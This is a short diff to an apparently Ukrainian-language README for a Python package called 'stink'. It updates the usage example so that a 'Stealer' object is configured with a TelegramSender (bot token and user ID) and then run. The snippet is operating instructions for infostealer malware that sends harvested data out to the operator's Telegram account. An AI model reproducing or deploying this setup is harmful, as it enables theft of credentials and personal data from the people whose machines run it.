@@ -115,9 +115,10 @@ Python являється інтерпретованою мовою програ
 3. Створюємо test.py (або будь-яку іншу назву) файл в цій же директорії з наступним кодом:
 ```python
 from stink import Stealer
+from stink.utils.senders import TelegramSender
 
 if __name__ == '__main__':
-    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
 ```
 
 ### За допомогою BAT
